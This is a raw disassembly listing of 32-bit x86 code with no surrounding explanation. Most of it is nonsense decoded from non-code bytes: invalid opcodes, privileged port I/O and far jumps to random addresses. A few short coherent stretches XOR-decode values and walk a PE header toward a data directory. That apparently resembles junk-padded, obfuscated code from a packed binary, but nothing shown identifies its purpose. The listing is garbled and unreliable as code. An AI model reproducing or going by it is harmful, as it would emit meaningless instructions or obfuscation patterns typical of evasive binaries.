  408c2f:	sbb    ch,BYTE PTR [esi]
  408c31:	pop    ss
  408c32:	adc    eax,DWORD PTR [eax+0x61]
  408c35:	xor    al,0xbd
  408c37:	mov    bh,0xcf
  408c39:	idiv   BYTE PTR [esi+0x44]
  408c3c:	mul    BYTE PTR [edx]
  408c3e:	retf   0x88b4
  408c41:	aam    0x15
  408c43:	loopne 0x408bc8
  408c45:	aad    0x28
  408c47:	loope  0x408be4
  408c49:	ret    
  408c4a:	xor    bl,BYTE PTR [eax+0x38]
  408c4d:	adc    DWORD PTR [edi-0x2ed4fe15],ebp
  408c53:	add    esp,DWORD PTR cs:[ebx-0x7b5d3817]
  408c5a:	jge    0x408c46
  408c5c:	mov    edx,0x78e9ab8d
  408c61:	aaa    
  408c62:	inc    ebx
  408c63:	dec    ebx
  408c64:	jmp    0x4ed3dd88
  408c69:	loopne 0x408c0a
  408c6b:	cmp    eax,0x76e6243b
  408c70:	fsub   QWORD PTR [ecx]
  408c72:	adc    DWORD PTR [ebx+0x7e55fb7c],edx
  408c78:	stos   BYTE PTR es:[edi],al
  408c79:	xor    DWORD PTR [ebx-0x61b34957],esp
  408c7f:	aas    
  408c80:	mov    ecx,0x33859381
  408c85:	dec    ecx
  408c86:	pushf  
  408c87:	sbb    DWORD PTR [ebp*1-0x2ba04ca],eax
  408c8e:	cli    
  408c8f:	lahf   
  408c90:	xchg   ecx,eax
  408c91:	repz inc esp
  408c93:	xlat   BYTE PTR ds:[ebx]
  408c94:	cld    
  408c95:	sub    eax,0x49dfdac7
  408c9a:	xchg   ecx,eax
  408c9b:	lock mov bh,0x6e
  408c9e:	mov    dh,0xc6
  408ca0:	inc    edx
  408ca1:	loope  0x408c5d
  408ca3:	jl     0x408c42
  408ca5:	(bad)  
  408ca6:	imul   esi,DWORD PTR [edx-0xb5e6a43],0x27
  408cad:	in     al,0x9e
  408caf:	mov    edx,0x1d2e06fc
  408cb4:	jno    0x408d20
  408cb6:	arpl   WORD PTR [edx+0x38b3726a],di
  408cbc:	sub    ebp,eax
  408cbe:	pushf  
  408cbf:	mov    ecx,DWORD PTR [ecx]
  408cc1:	xchg   cx,ax
  408cc3:	and    BYTE PTR [ebp-0x35e9b357],dl
  408cc9:	and    BYTE PTR [ebp-0x6234f7dc],ah
  408ccf:	cli    
  408cd0:	inc    eax
  408cd1:	inc    esp
  408cd2:	(bad)  
  408cd3:	stc    
  408cd4:	ret    0xfe0e
  408cd7:	sar    cl,1
  408cd9:	and    eax,0x90bb1b91
  408cde:	repz (bad) 
  408ce0:	ins    BYTE PTR es:[edi],dx
  408ce1:	ja     0x408c69
  408ce3:	jecxz  0x408cfa
  408ce5:	fdivr  st,st(0)
  408ce7:	out    0xfc,al
  408ce9:	je     0x408d4f
  408ceb:	cmp    eax,0x65348dee
  408cf0:	inc    edi
  408cf1:	loope  0x408c82
  408cf3:	out    0xa1,al
  408cf5:	mov    eax,0xf98529f3
  408cfa:	mov    cs,ebx
  408cfc:	enter  0xa8ec,0xe0
  408d00:	mov    ch,0xbb
  408d02:	xchg   edx,eax
  408d03:	and    ch,0x52
  408d06:	pop    esi
  408d07:	xor    edx,esp
  408d09:	test   eax,0xd5f5a379
  408d0e:	(bad)  
  408d0f:	test   eax,0xa4d27568
  408d14:	out    dx,al
  408d15:	ja     0x408cbb
  408d17:	bound  edi,QWORD PTR [edx+0x6b]
  408d1a:	imul   edx,DWORD PTR [ecx-0x59b22390],0x67
  408d21:	jp     0x408ccd
  408d23:	adc    BYTE PTR [ebp+ecx*1+0x48],dl
  408d27:	lea    ebp,ds:0x993660f5
  408d2d:	dec    eax
  408d2e:	rcr    BYTE PTR [edi],1
  408d30:	lods   eax,DWORD PTR ds:[esi]
  408d31:	test   eax,0xee44a32f
  408d36:	mov    ecx,0x8df22c0d
  408d3b:	repz jmp FWORD PTR [edx]
  408d3e:	mov    esp,0x4c2df56b
  408d43:	xchg   edx,eax
  408d44:	push   cs
  408d45:	outs   dx,BYTE PTR ds:[esi]
  408d46:	push   ss
  408d47:	xchg   edx,eax
  408d48:	stos   BYTE PTR es:[edi],al
  408d49:	push   ebp
  408d4a:	and    eax,0x304d641e
  408d4f:	and    BYTE PTR [esi],dl
  408d51:	mov    bl,0x16
  408d53:	cld    
  408d54:	cdq    
  408d55:	pop    ss
  408d56:	hlt    
  408d57:	imul   edi,DWORD PTR [esp+eiz*2-0x2ffe6128],0xcdee3036
  408d62:	outs   dx,BYTE PTR ds:[esi]
  408d63:	mul    BYTE PTR [esi+0x6a]
  408d66:	lods   eax,DWORD PTR ds:[esi]
  408d67:	mov    ss,WORD PTR [eax+ebx*4+0x4f]
  408d6b:	inc    edx
  408d6c:	push   0xab2c8f48
  408d71:	inc    DWORD PTR [edi+0x7279a5b4]
  408d77:	(bad)  [edx]
  408d79:	fs neg bl
  408d7c:	(bad)  
  408d7e:	jmp    0xaa1e:0x66542693
  408d85:	mov    esp,0x61abc015
  408d8a:	mov    al,ds:0x2b5038f5
  408d8f:	cmc    
  408d90:	push   ebx
  408d91:	cmp    edx,DWORD PTR [esi-0x6e]
  408d94:	push   0x6ea3027c
  408d99:	fwait
  408d9a:	imul   ebx,DWORD PTR [edi+0x5b3b6941],0x5f48e24
  408da4:	push   ss
  408da5:	cli    
  408da6:	push   es
  408da7:	lock call 0xb09e:0xd1736521
  408daf:	das    
  408db0:	fcomp  st(6)
  408db2:	xchg   edi,eax
  408db3:	popf   
  408db4:	or     esp,0x6f12e448
  408dba:	or     BYTE PTR ds:0xb9396b3f,cl
  408dc0:	mov    cl,0x69
  408dc2:	or     bh,BYTE PTR [eax]
  408dc4:	ss (bad) 
  408dc6:	loop   0x408de3
  408dc8:	or     DWORD PTR [eax],ebp
  408dca:	jno    0x408e15
  408dcc:	push   edx
  408dcd:	push   cs
  408dce:	pusha  
  408dcf:	mov    edi,0xd474b0a5
  408dd4:	inc    esi
  408dd5:	in     eax,dx
  408dd6:	mov    esi,0xb97b1fb
  408ddb:	and    al,BYTE PTR ds:0x9defc867
  408de1:	outs   dx,DWORD PTR ds:[esi]
  408de2:	and    DWORD PTR [ebx-0x75],esp
  408de5:	jno    0x408e5f
  408de7:	fneni(8087 only) 
  408de9:	aad    0x26
  408deb:	push   ecx
  408dec:	inc    edi
  408ded:	sub    eax,0x107edab1
  408df2:	push   edi
  408df3:	shr    esi,cl
  408df5:	shr    DWORD PTR [ecx-0x8],1
  408df8:	xor    DWORD PTR [edx+0x1c],eax
  408dfb:	sub    DWORD PTR [ecx+0x18299f28],esp
  408e01:	daa    
  408e02:	jno    0x408dbc
  408e04:	sub    eax,0x42e0b055
  408e09:	xchg   ebx,eax
  408e0a:	sub    esp,DWORD PTR [esi-0x7e15d779]
  408e10:	imul   edi,DWORD PTR [ecx+ecx*4],0x15b5dd8d
  408e17:	cld    
  408e18:	cmp    eax,0x7efae933
  408e1d:	dec    eax
  408e1e:	sti    
  408e1f:	jb     0x408de6
  408e21:	data16 adc dl,BYTE PTR [eax+0x38]
  408e25:	stc    
  408e26:	mov    ax,WORD PTR [ebp-0x4]
  408e2a:	movzx  eax,ax
  408e2d:	sub    ecx,edi
  408e2f:	cmp    eax,ecx
  408e31:	mov    eax,DWORD PTR [ebp+0x10]
  408e34:	movzx  ecx,WORD PTR [ebp-0x4]
  408e38:	jg     0x408e4d
  408e3e:	xor    eax,esi
  408e40:	sub    ecx,eax
  408e42:	sub    ecx,edi
  408e44:	mov    WORD PTR [ebp-0x4],cx
  408e48:	jmp    0x408e5a
  408e4d:	xor    eax,esi
  408e4f:	lea    eax,[eax+ecx*1+0x32729b]
  408e56:	mov    WORD PTR [ebp-0x4],ax
  408e5a:	mov    eax,DWORD PTR [ebp-0xc]
  408e5d:	cmp    eax,ebx
  408e5f:	je     0x408e73
  408e65:	mov    eax,DWORD PTR [ebp-0x8]
  408e68:	mov    DWORD PTR [eax],0x60341e89
  408e6e:	jmp    0x409836
  408e73:	mov    eax,DWORD PTR [ebp+0x8]
  408e76:	mov    ecx,DWORD PTR [ebp-0x8]
  408e79:	xor    eax,esi
  408e7b:	add    eax,edi
  408e7d:	cmp    DWORD PTR [ecx],eax
  408e7f:	je     0x409149
  408e85:	mov    ecx,DWORD PTR [ebp-0x14]
  408e88:	mov    eax,DWORD PTR [ebp-0x8]
  408e8b:	mov    eax,DWORD PTR [eax]
  408e8d:	mov    eax,DWORD PTR [eax+0x3c]
  408e90:	lea    ecx,[ecx*8+0x78]
  408e97:	add    eax,ecx
  408e99:	mov    ecx,DWORD PTR [ebp-0x8]
  408e9c:	mov    ecx,DWORD PTR [ecx]
  408e9e:	mov    eax,DWORD PTR [eax+ecx*1]
  408ea1:	mov    DWORD PTR [ebp-0x1c],eax
  408ea4:	mov    eax,DWORD PTR [ebp+0x8]
  408ea7:	jmp    0x4090ee
  408eac:	sbb    al,0x56
  408eae:	aam    0xcf
  408eb0:	je     0x408eff
  408eb2:	and    eax,0xfc4f2b75
  408eb7:	adc    eax,0x51139f96
  408ebc:	or     al,0xd1
  408ebe:	jle    0x408f3e
  408ec0:	and    al,0x7c
  408ec2:	jle    0x408f42
  408ec4:	add    BYTE PTR [eax],dl
  408ec6:	xchg   ecx,eax
  408ec7:	outs   dx,BYTE PTR ds:[esi]
  408ec8:	rol    DWORD PTR [ecx+edi*4],1
  408ecb:	outs   dx,DWORD PTR ds:[esi]
  408ecc:	into   
  408ecd:	fldcw  WORD PTR [edi]
  408ecf:	add    al,0xd4
  408ed1:	mov    ds:0x5bca279e,eax
  408ed6:	jo     0x408f0f
  408ed8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ed9:	rcr    DWORD PTR [ecx],cl
  408edb:	push   eax
  408edc:	dec    ecx
  408edd:	rol    DWORD PTR [ecx-0x48],cl
  408ee0:	cdq    
  408ee1:	std    
  408ee2:	lahf   
  408ee3:	sbb    ebx,DWORD PTR [esi+ecx*4-0x7]
  408ee7:	adc    esi,edx
  408ee9:	push   ecx
  408eea:	cli    
  408eeb:	mov    al,ds:0x7e2147a3
  408ef0:	test   DWORD PTR [ebp-0x6b],ecx
  408ef3:	mov    eax,0xb3941f8b
  408ef8:	add    bh,dl
  408efa:	xchg   DWORD PTR [edx],edx
  408efc:	sub    DWORD PTR [eax+0xb],eax
  408eff:	scas   eax,DWORD PTR es:[edi]
  408f00:	sub    edi,esp
  408f02:	repnz cmp BYTE PTR [ecx],al
  408f05:	cmp    al,0xdf
  408f07:	test   BYTE PTR [esi],al
  408f09:	jl     0x408f4d
  408f0b:	mov    esi,0xcb789e1
  408f10:	add    eax,0x1b73b9b1
  408f15:	lahf   
  408f16:	out    dx,al
  408f17:	xchg   ebp,eax
  408f18:	stos   DWORD PTR es:[edi],eax
  408f19:	mov    eax,0x25bde634
  408f1e:	add    edi,DWORD PTR [esi]
  408f20:	pop    edi
  408f21:	adc    al,0xa2
  408f23:	mov    dh,0x59
  408f25:	xlat   BYTE PTR ds:[ebx]
  408f26:	push   edi
  408f27:	mov    edx,0x2d368d06
  408f2c:	stc    
  408f2d:	mov    eax,DWORD PTR [eax]
  408f2f:	jns    0x408eff
  408f31:	sbb    al,0xcf
  408f33:	jae    0x408f64
  408f35:	dec    ecx
  408f36:	dec    edx
  408f37:	push   ds
  408f38:	das    
  408f39:	cld    
  408f3a:	mov    ds:0x2c17b065,eax
  408f3f:	push   eax
  408f40:	and    edx,DWORD PTR [esi]
  408f42:	cmp    dl,BYTE PTR [ecx+0x17]
  408f45:	sub    bh,BYTE PTR [edx]
  408f47:	nop
  408f48:	dec    edx
  408f49:	shl    BYTE PTR [ebx],0xd6
  408f4c:	aas    
  408f4d:	xchg   esi,eax
  408f4e:	fld    TBYTE PTR [esi-0xc]
  408f51:	cmp    eax,0xe0b6acd4
  408f56:	push   ebp
  408f57:	test   BYTE PTR [ecx-0x236fe935],0xff
  408f5e:	popf   
  408f5f:	add    BYTE PTR ds:[esi+0x1],al
  408f63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f64:	mov    ch,0xa7
  408f66:	push   ebx
  408f67:	retf   
  408f68:	rcl    dh,0x88
  408f6b:	push   ebx
  408f6c:	sbb    ecx,DWORD PTR [esi-0x67]
  408f6f:	push   ecx
  408f70:	loop   0x408f6d
  408f72:	push   eax
  408f73:	addr16 punpckhwd mm1,mm4
  408f77:	loop   0x408f7e
  408f79:	sbb    eax,0x6e2738ae
  408f7e:	ins    BYTE PTR es:[edi],dx
  408f7f:	inc    ebx
  408f80:	lea    edi,[edi]
  408f82:	loopne 0x408f28
  408f84:	xor    dh,BYTE PTR [esi+ecx*1]
  408f87:	into   
  408f88:	or     cl,0xf5
  408f8b:	sub    ecx,edi
  408f8d:	inc    eax
  408f8e:	div    edi
  408f90:	xchg   ecx,eax
  408f91:	add    dl,BYTE PTR [esi-0x7722f735]
  408f97:	addr16 jno 0x408f4a
  408f9a:	scas   eax,DWORD PTR es:[edi]
  408f9b:	into   
  408f9c:	xor    ebp,ebp
  408f9e:	adc    DWORD PTR [eax+0x31],ebp
  408fa1:	adc    eax,0xb16e6406
  408fa6:	xchg   ecx,eax
  408fa7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408fa8:	js     0x408f62
  408faa:	dec    ecx
  408fab:	jb     0x408fd0
  408fad:	xor    eax,0xd4eff733
  408fb2:	pop    ss
  408fb3:	cs retf 0x4b0e
  408fb7:	dec    edx
  408fb8:	fisttp WORD PTR [edx+0x2a303cc9]
  408fbe:	xor    ebx,DWORD PTR [ebx+0x78]
  408fc1:	push   eax
  408fc2:	out    0x64,eax
  408fc4:	stos   DWORD PTR es:[edi],eax
  408fc5:	or     eax,0xa6cb9c7
  408fca:	push   ds
  408fcb:	push   esi
  408fcc:	sbb    al,0xf4
  408fce:	test   BYTE PTR [ecx+0x78],ah
  408fd1:	mov    ds:0x8ff654f3,eax
  408fd6:	pop    edi
  408fd7:	loope  0x408f76
  408fd9:	(bad)  
  408fda:	(bad)
  408fde:	add    al,0x40
  408fe0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fe1:	pop    edx
  408fe2:	aas    
  408fe3:	mov    ecx,ebp
  408fe5:	pop    esi
  408fe6:	in     al,dx
  408fe7:	jp     0x40902a
  408fe9:	retf   0x31d9
  408fec:	jae    0x408f9b
  408fee:	fbld   TBYTE PTR [eax+0x4eeb9d68]
  408ff4:	xchg   esi,eax
  408ff5:	ficomp DWORD PTR [edx]
  408ff7:	int    0x2c
  408ff9:	mov    cl,BYTE PTR [ebx+ecx*4-0x61d11164]
  409000:	int    0xfb
  409002:	clc    
  409003:	gs adc cl,ah
  409006:	xchg   ebx,eax
  409007:	xchg   ebx,eax
  409008:	fiadd  DWORD PTR ds:0x34957cb9
  40900e:	push   es
  40900f:	(bad)
  409012:	xor    BYTE PTR [ebx-0x3a2a9a1],dl
  409018:	fcom   QWORD PTR [ebx+esi*8-0x30a159b4]
  40901f:	jmp    0xf6b4eda0
  409024:	and    BYTE PTR [ecx],bh
  409026:	dec    edi
  409027:	fbstp  TBYTE PTR [eax-0x16fa71f9]
  40902d:	ret    
  40902e:	sub    BYTE PTR [edi+0xf7f7fe3],bh
  409034:	pop    es
  409035:	mov    ecx,0xd8442430
  40903a:	jnp    0x40906a
  40903c:	loope  0x408ff4
  40903e:	stos   BYTE PTR es:[edi],al
  40903f:	jmp    0x4c042936
  409044:	jbe    0x4090bc
  409046:	adc    BYTE PTR [esi],0x85
  409049:	sar    DWORD PTR [eax+eax*8],1
  40904c:	into   
  40904d:	(bad)  
  40904f:	fadd   QWORD PTR [ecx-0x30]
  409052:	jae    0x409084
  409054:	cmp    DWORD PTR ds:[edi+0x6e],ebx
  409058:	inc    edi
  409059:	inc    eax
  40905a:	sub    DWORD PTR [ebx+0x34b6c694],ecx
  409060:	imul   ecx,DWORD PTR [esp+esi*2],0x5a433f77
  409067:	adc    eax,0xb3a8bc04
  40906c:	sbb    DWORD PTR [ebp+eax*8+0x24e0c74b],eax
  409073:	mov    edx,DWORD PTR [edi+0x4c30caad]
  409079:	mov    esi,0x9b6aea26
  40907e:	lods   al,BYTE PTR ds:[esi]
  40907f:	adc    DWORD PTR [ecx-0x3cdb7f67],eax
  409085:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409086:	(bad)  
  409087:	sbb    ecx,DWORD PTR [edi+0x64e9093e]
  40908d:	sbb    BYTE PTR [edi-0x78],ah
  409090:	lods   eax,DWORD PTR ds:[esi]
  409091:	jbe    0x40906c
  409093:	dec    edx
  409094:	push   edi
  409095:	mov    ?,WORD PTR [ebx-0x5c07998]
  40909b:	cmp    eax,0x76315e24
  4090a0:	retf   0xcede
  4090a3:	out    dx,al
  4090a4:	mov    edx,0xe23ca8c8
  4090a9:	cs popf 
  4090ab:	repnz sub ebx,DWORD PTR [esi+ecx*1+0x3a]
  4090b0:	fcmovbe st,st(5)
  4090b2:	inc    eax
  4090b3:	xor    DWORD PTR ds:0x380595ed,0x72238d1
  4090bd:	fwait
  4090be:	loopne 0x409078
  4090c0:	push   es
  4090c1:	mov    gs,ebp
  4090c3:	sti    
  4090c4:	mov    bl,0x3f
  4090c6:	je     0x409092
  4090c8:	or     bl,dh
  4090ca:	sbb    DWORD PTR [ebp+0x44898854],esp
  4090d0:	rcr    DWORD PTR [eax+0x7add92d5],cl
  4090d6:	adc    ebp,edi
  4090d8:	xchg   ebp,eax
  4090d9:	clc    
  4090da:	sbb    al,BYTE PTR [esp+edi*2-0x7fee2f11]
  4090e1:	push   ss
  4090e2:	pop    ebp
  4090e3:	jbe    0x409140
  4090e5:	mov    bl,0x1c
  4090e7:	pop    ebx
  4090e8:	fist   WORD PTR [ecx+eiz*1+0x29]
  4090ec:	push   ds
  4090ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090ee:	xor    eax,esi
  4090f0:	add    eax,edi
  4090f2:	mov    DWORD PTR [ebp-0x20],eax
  4090f5:	mov    eax,DWORD PTR [ebp+0x8]
  4090f8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4090fb:	xor    eax,esi
  4090fd:	add    eax,edi
  4090ff:	cmp    ecx,eax
  409101:	je     0x409836
  409107:	mov    eax,DWORD PTR [ebp-0x8]
  40910a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40910d:	add    ecx,DWORD PTR [eax]
  40910f:	mov    DWORD PTR [ebp-0x20],ecx
  409112:	mov    eax,DWORD PTR [ebp-0x20]
  409115:	mov    ecx,DWORD PTR [ebp-0x8]
  409118:	mov    eax,DWORD PTR [eax+0xc]
  40911b:	mov    ecx,DWORD PTR [ecx]
  40911d:	mov    al,BYTE PTR [eax+ecx*1]
  409120:	add    al,0x38
  409122:	xor    al,0x46
  409124:	cmp    al,0xc5
  409126:	je     0x40913d
  40912c:	mov    eax,DWORD PTR [ebp+0x8]
  40912f:	mov    ecx,DWORD PTR [ebp-0x8]
  409132:	xor    eax,esi
  409134:	add    eax,edi
  409136:	mov    DWORD PTR [ecx],eax
  409138:	jmp    0x409836
  40913d:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  409144:	jmp    0x409836
  409149:	mov    eax,DWORD PTR [ebp-0x8]
  40914c:	mov    ecx,DWORD PTR [ebp-0x18]
  40914f:	mov    ecx,DWORD PTR [ecx]
  409151:	jmp    0x409398
  409156:	sbb    eax,0xe1aec100
  40915b:	outs   dx,DWORD PTR ds:[esi]
  40915c:	jno    0x4090ef
  40915e:	out    dx,al
  40915f:	jne    0x4090f6
  409161:	mov    bh,0x1e
  409163:	stc    
  409164:	retf   0x3251
  409167:	fistp  QWORD PTR [esi+0x7e]
  40916a:	and    al,0x7c
  40916c:	jle    0x4091ec
  40916e:	or     eax,0xd5bb5b4a
  409173:	ins    BYTE PTR es:[edi],dx
  409174:	push   edi
  409175:	pushf  
  409176:	scas   eax,DWORD PTR es:[edi]
  409177:	mul    ecx
  409179:	rcr    BYTE PTR [edi+0x37],0xea
  40917d:	xchg   esi,eax
  40917e:	fist   WORD PTR [edi+0x14]
  409181:	and    eax,0xff253365
  409186:	and    al,al
  409188:	shl    bl,1
  40918a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40918b:	ja     0x40913e
  40918d:	push   ss
  40918e:	retf   0xbb04
  409191:	push   ecx
  409192:	nop
  409193:	stc    
  409194:	dec    ecx
  409195:	arpl   WORD PTR [edx+ecx*1],bx
  409198:	loopne 0x4091dd
  40919a:	jecxz  0x409163
  40919c:	push   edi
  40919d:	adc    esi,DWORD PTR [esi-0x20]
  4091a0:	es icebp 
  4091a2:	test   BYTE PTR [ebx+eax*2+0x3a3c46e2],ch
  4091a9:	dec    esp
  4091aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091ab:	fadd   DWORD PTR ds:0x8a74d75a
  4091b1:	enter  0xb326,0x25
  4091b5:	mov    ecx,0x68ac47a3
  4091ba:	mov    esp,0xc74ac912
  4091bf:	cmp    BYTE PTR [edx-0x6902d674],al
  4091c5:	repnz or cl,0x6f
  4091c9:	fiadd  WORD PTR [edi]
  4091cb:	add    DWORD PTR ds:0x50dca953,edx
  4091d1:	push   esi
  4091d2:	lea    ebp,[esi+0x30]
  4091d5:	jmp    0xba02a911
  4091da:	cmc    
  4091db:	xchg   DWORD PTR [edx+0x5352aaf5],ebp
  4091e1:	push   ecx
  4091e2:	mov    edx,0x8dd8d4
  4091e7:	imul   DWORD PTR [esp+ebx*4]
  4091ea:	add    eax,0xb15d8d86
  4091ef:	inc    esi
  4091f0:	les    edx,FWORD PTR [edi]
  4091f2:	ins    BYTE PTR es:[edi],dx
  4091f3:	ret    0x9c9f
  4091f6:	and    ecx,ebx
  4091f8:	lods   al,BYTE PTR ds:[esi]
  4091f9:	cld    
  4091fa:	adc    esi,DWORD PTR [ebp-0x77156600]
  409200:	loop   0x40922e
  409202:	pop    edx
  409203:	ss push edx
  409205:	loop   0x40926c
  409207:	repnz rcl dl,0xfe
  40920b:	(bad)  
  40920c:	adc    DWORD PTR [edx-0x2e65250f],edx
  409212:	and    eax,0xb47a9add
  409217:	cs dec eax
  409219:	xor    BYTE PTR [edx-0x588efca7],0xf6
  409220:	xchg   ah,ch
  409222:	test   al,0x24
  409224:	mov    DWORD PTR [edx],ecx
  409226:	ror    DWORD PTR [edx-0x759fe8f2],0xc7
  40922d:	popa   
  40922e:	imul   ebx,DWORD PTR [ebp+eiz*8+0x7f],0x588dafdc
  409236:	sar    DWORD PTR [esp+edx*4-0x7a],1
  40923a:	pop    ebp
  40923b:	xchg   esp,eax
  40923c:	mov    eax,0x58b7a36a
  409241:	cmp    al,0xcf
  409243:	sbb    ecx,DWORD PTR [ebp+0x3b]
  409246:	push   esi
  409247:	or     eax,0x9032091a
  40924c:	xor    DWORD PTR [ebx+0x6aea1b0d],edi
  409252:	add    al,0x83
  409254:	mov    eax,0xa0372df
  409259:	jne    0x40923b
  40925b:	xor    DWORD PTR [esi],eax
  40925d:	int    0xdf
  40925f:	pop    ds
  409260:	push   es
  409261:	in     al,dx
  409262:	mov    bl,0x2f
  409264:	dec    ebp
  409265:	mov    al,ds:0x6292879
  40926a:	fcmovne st,st(7)
  40926c:	xchg   ecx,eax
  40926d:	cmp    al,0x20
  40926f:	lds    eax,FWORD PTR [eax+0x4b67d0d4]
  409275:	lahf   
  409276:	xchg   edx,eax
  409277:	mov    ebp,0x742c4fb8
  40927c:	inc    edx
  40927d:	sti    
  40927e:	xor    eax,0x11457a02
  409283:	fcom   DWORD PTR [ecx+0x349bc92d]
  409289:	lock inc ecx
  40928b:	push   esp
  40928c:	cmc    
  40928d:	mov    al,0xd0
  40928f:	jnp    0x40929d
  409291:	pop    edi
  409292:	push   ebp
  409293:	mov    ebp,0x9b3215a5
  409298:	in     eax,dx
  409299:	mov    eax,0x65a4b9b
  40929e:	addr16 jae 0x409252
  4092a1:	push   eax
  4092a2:	xor    al,0xbe
  4092a4:	or     eax,0xad22aa37
  4092a9:	cdq    
  4092aa:	es out 0x3d,eax
  4092ad:	sub    dl,BYTE PTR [ecx]
  4092af:	popa   
  4092b0:	(bad)  
  4092b2:	cld    
  4092b3:	xchg   edx,eax
  4092b4:	add    ah,al
  4092b6:	or     al,0xca
  4092b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092b9:	mov    ah,0x75
  4092bb:	sub    al,cl
  4092bd:	pushf  
  4092be:	out    0xb0,al
  4092c0:	xchg   esi,eax
  4092c1:	shr    BYTE PTR [eax],1
  4092c3:	retf   
  4092c4:	push   eax
  4092c5:	and    eax,0x723c7cbf
  4092ca:	and    al,0x19
  4092cc:	sahf   
  4092cd:	ins    DWORD PTR es:[edi],dx
  4092ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092cf:	xchg   esi,eax
  4092d0:	ret    
  4092d1:	stc    
  4092d2:	adc    BYTE PTR [ecx+edi*8+0x40],cl
  4092d6:	inc    ebx
  4092d7:	xlat   BYTE PTR ds:[ebx]
  4092d8:	stos   BYTE PTR es:[edi],al
  4092d9:	pop    ebx
  4092da:	xchg   BYTE PTR [edi-0x2fb11c0e],bh
  4092e0:	cli    
  4092e1:	adc    al,0xdc
  4092e3:	cwde   
  4092e4:	or     DWORD PTR [esi+0x48481118],eax
  4092ea:	and    bh,ch
  4092ec:	sub    eax,0x992463a3
  4092f1:	push   ss
  4092f2:	mov    ch,0x46
  4092f4:	rol    BYTE PTR [edi-0x58722520],0x3
  4092fb:	inc    BYTE PTR [ecx-0x31]
  4092fe:	adc    bh,BYTE PTR [edx]
  409300:	test   DWORD PTR [edi+0x7233b730],esi
  409306:	xchg   esp,eax
  409307:	push   ss
  409308:	fsub   QWORD PTR [eax]
  40930a:	dec    esp
  40930b:	js     0x409378
  40930d:	ins    BYTE PTR es:[edi],dx
  40930e:	and    eax,0x9ba24726
  409313:	inc    eax
  409314:	and    BYTE PTR [esi-0x6d],al
  409317:	fcomp  DWORD PTR [edx+edx*4-0x44]
  40931b:	aam    0xaf
  40931d:	int    0xce
  40931f:	add    DWORD PTR [ecx+0x4b],0xf4de5769
  409326:	rcr    esp,cl
  409328:	jmp    0x9bf37b26
  40932d:	sahf   
  40932e:	mov    dl,0xff
  409330:	mov    al,0xf8
  409332:	faddp  st(7),st
  409334:	adc    eax,0x5b208f3d
  409339:	sub    edi,DWORD PTR ds:0xc4fc6632
  40933f:	jmp    DWORD PTR [eax+ebx*1-0x4d]
  409343:	pop    edx
  409344:	mov    ds:0xe324330c,al
  40934a:	sub    al,0x80
  40934c:	jb     0x409358
  40934e:	jg     0x4092ee
  409350:	adc    al,0x4e
  409352:	inc    edi
  409353:	xchg   ebx,eax
  409354:	add    BYTE PTR [eax+0x73],ah
  409357:	jg     0x4092d9
  409359:	pop    esi
  40935a:	cli    
  40935b:	jecxz  0x40938a
  40935d:	sbb    DWORD PTR [ebx-0x77c9ac57],edi
  409363:	lock cld 
  409365:	stc    
  409366:	push   cs
  409367:	mov    cl,0x30
  409369:	jnp    0x409371
  40936b:	sbb    DWORD PTR [ebx+0xf0e4c12],0xadaff1ab
  409375:	ja     0x4093a0
  409377:	inc    edi
  409378:	dec    edi
  409379:	adc    ebp,DWORD PTR [ebx+ebx*2]
  40937c:	mov    al,ds:0xb2bf81da
  409381:	cmp    DWORD PTR [ebx],esi
  409383:	push   ds
  409384:	push   cs
  409385:	xor    dl,0xeb
  409388:	out    0xb0,eax
  40938a:	dec    ebx
  40938b:	inc    eax
  40938c:	aam    0x8
  40938e:	push   edi
  40938f:	js     0x40939e
  409391:	cli    
  409392:	mov    cr4,edi
  409395:	or     eax,0x889226e
  40939a:	mov    eax,DWORD PTR [ebp+0xc]
  40939d:	mov    eax,DWORD PTR [ebp+0x8]
  4093a0:	push   DWORD PTR [ebp-0x8]
  4093a3:	jmp    0x4095ea
  4093a8:	lods   eax,DWORD PTR ds:[esi]
  4093a9:	mov    dl,0xfe
  4093ab:	outs   dx,BYTE PTR ds:[esi]
  4093ac:	xor    DWORD PTR [edx+0x6d],0x15d7aa71
  4093b3:	pop    edi
  4093b4:	xchg   ecx,eax
  4093b5:	repnz hlt 
  4093b7:	data16 fcomp st(5)
  4093ba:	jle    0x40943a
  4093bc:	and    al,0x7c
  4093be:	jle    0x40943e
  4093c0:	adc    al,0xb3
  4093c2:	and    esp,ebp
  4093c4:	outs   dx,DWORD PTR ds:[esi]
  4093c5:	call   0xf208:0xd6520484
  4093cc:	mov    esp,esi
  4093ce:	jecxz  0x4093fe
  4093d0:	add    cl,BYTE PTR [ebx+eax*8-0x9]
  4093d4:	add    edi,eax
  4093d6:	lahf   
  4093d7:	daa    
  4093d8:	cmp    DWORD PTR [edx+0x71acb432],esp
  4093de:	sbb    DWORD PTR [edi+0x6da89b67],ebx
  4093e4:	pop    ss
  4093e5:	dec    ebp
  4093e6:	in     eax,dx
  4093e7:	jo     0x4093ad
  4093e9:	or     eax,0xd201ef8d
  4093ee:	scas   eax,DWORD PTR es:[edi]
  4093ef:	cmp    BYTE PTR [edi],al
  4093f1:	adc    eax,ebx
  4093f3:	cmp    DWORD PTR [ecx+eax*1-0xcb5f0a6],edi
  4093fa:	dec    edx
  4093fb:	xchg   ecx,eax
  4093fc:	fsub   QWORD PTR [esi]
  4093fe:	popf   
  4093ff:	dec    eax
  409400:	js     0x40941c
  409402:	lods   eax,DWORD PTR ds:[esi]
  409403:	cdq    
  409404:	xchg   ecx,eax
  409405:	test   BYTE PTR [esi+0x0],ah
  409408:	dec    ecx
  409409:	mov    cl,dh
  40940b:	sbb    BYTE PTR [edi+0x58],al
  40940e:	lods   al,BYTE PTR ds:[esi]
  40940f:	bswap  edi
  409411:	cli    
  409412:	and    al,0x3e
  409414:	push   es
